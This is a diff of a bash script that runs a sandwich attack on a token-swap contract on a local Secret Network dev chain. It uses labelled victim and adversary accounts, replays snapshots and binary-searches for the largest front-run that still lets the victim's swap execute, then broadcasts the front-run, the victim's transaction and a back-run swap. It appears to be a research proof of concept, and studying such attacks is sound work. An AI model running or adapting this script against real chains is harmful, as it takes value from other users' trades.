@@ -1,15 +1,15 @@
 set -x
 set -e
 
-VICTIM='secret1fc3fzy78ttp0lwuujw7e52rhspxn8uj52zfyne'
-ADV='secret1ap26qrlp8mcq2pg6r47w43l0y8zkqm8a450s03'
-ADMIN='secret1ajz54hz8azwuy34qwy9fkjnfcrvf0dzswy0lqq'
+VICTIM='secret1ldjxljw7v4vk6zhyduywh04hpj0jdwxsmrlatf'
+ADV='secret1ajz54hz8azwuy34qwy9fkjnfcrvf0dzswy0lqq'
+ADMIN='secret1fc3fzy78ttp0lwuujw7e52rhspxn8uj52zfyne'
 UNIQUE_LABEL=$(date '+%Y-%m-%d-%H:%M:%S')
 PASSPHRASE=`cat passphrase.txt`
 CHAIN_ID='secretdev-1'
 SECRETD=./secretd
 
-sleep_time=3
+sleep_time=5
 
 generate_and_sign_tx() {
   $SECRETD tx compute execute $CONTRACT_ADDRESS --generate-only "{\"swap\":{\"token_type\":\"$1\",\"offer_amt\":$2,\"expected_return_amt\":$3,\"receiver\":\"$4\"}}" --from $4 --enclave-key io-master-cert.der --code-hash $CODE_HASH --label $UNIQUE_LABEL -y --broadcast-mode sync > tx_$5.json
@@ -17,15 +17,8 @@ generate_and_sign_tx() {
 }
 
 deliver_tx() {
-  tx=$(echo $PASSPHRASE | $SECRETD tx compute delivertx tx_$1_sign.json --from $ADMIN --keyring-backend file -y)
-#  echo $tx
+  echo $PASSPHRASE | $SECRETD tx compute delivertx tx_$1_sign.json --from $ADMIN --keyring-backend file -y
   sleep $sleep_time
-#  tx_hash=$(echo $tx | jq -r .txhash )
-#  echo $tx_hash
-  seq=$(cat tx_$1_sign.json | jq -r .auth_info.signer_infos[0].sequence)
-  echo $seq
-  tx_result_code=$($SECRETD q tx --type=acc_seq $2/$seq | jq .code)
-  echo $tx_result_code
 }
 
 execute_tx() {
@@ -43,6 +36,16 @@ reset_snapshot() {
     sleep $sleep_time
 }
 
+query_pool() {
+  size=$(echo $PASSPHRASE | $SECRETD q compute query $CONTRACT_ADDRESS "{\"$1\":{}}")
+  echo $size
+}
+
+broadcast_tx() {
+   echo $PASSPHRASE | $SECRETD tx broadcast tx_$1_sign.json --from $ADMIN --keyring-backend file -y
+  sleep $sleep_time
+}
+
 reset_snapshot
 ./node_modules/.bin/jest -t Deploy
 
@@ -52,35 +55,45 @@ CODE_HASH=`cat codeHash.txt`
 # make victim tx
 generate_and_sign_tx token_a 10 20 $VICTIM victim
 
-# make front-run tx
-#generate_and_sign_tx token_a 1 0 $ADV adv
-generate_and_sign_tx token_a 100 0 $ADV adv
-
-
 cnt=0
-set_snapshot 1
+lo=15
+hi=25
+while [ $(expr $hi - $lo) -ne 1 ]; do
+  mid=$(expr '(' $hi + $lo ')' / 2)
+  echo $lo $hi $mid
 
-deliver_tx adv $ADV
+  generate_and_sign_tx token_a $mid 0 $ADV adv
+
+  set_snapshot $cnt
+
+  query_pool pool_a
+  deliver_tx adv
+  old_pool_a=$(query_pool pool_a)
+  deliver_tx victim
+  new_pool_a=$(query_pool pool_a)
+  dif_pool_a=$(($new_pool_a - $old_pool_a))
+  echo $old_pool_a $new_pool_a $dif_pool_a
+
+  if [ $dif_pool_a -gt 0 ]; then lo=$mid; else hi=$mid; fi
+  cnt=$((cnt + 1))
+done
+echo $lo
+
+# make front-run tx
+generate_and_sign_tx token_a $lo 0 $ADV adv
+
+set_snapshot $cnt
+old_pool_b=$(query_pool pool_b)
+deliver_tx adv
+new_pool_b=$(query_pool pool_b)
+dif_pool_b=$(($old_pool_b - $new_pool_b))
+
+# broadcast all 3 txs
+reset_snapshot
+broadcast_tx adv
 ./node_modules/.bin/jest -t QuerySwap
-deliver_tx victim $VICTIM
+broadcast_tx victim
 ./node_modules/.bin/jest -t QuerySwap
-
-## make back-run tx
-#
-## broadcast all 3 txs
-#set_snapshot 'snapshot2'
-#deliver_tx tx_victim_sign.json
-#
-#sleep 10
-#
-#./node_modules/.bin/jest -t QuerySwap
-
-#lo=1
-#hi=1000
-#target=101
-#while [ $(expr $hi - $lo) -ne 1 ]; do
-#  mid=$(expr '(' $hi + $lo ')' / 2)
-#
-#  if [ $mid -le $target ]; then lo=$mid; else hi=$mid; fi
-#done
-#echo "$lo"
+# send back-run tx
+execute_tx token_b $dif_pool_b 0 $ADV
+./node_modules/.bin/jest -t QuerySwap
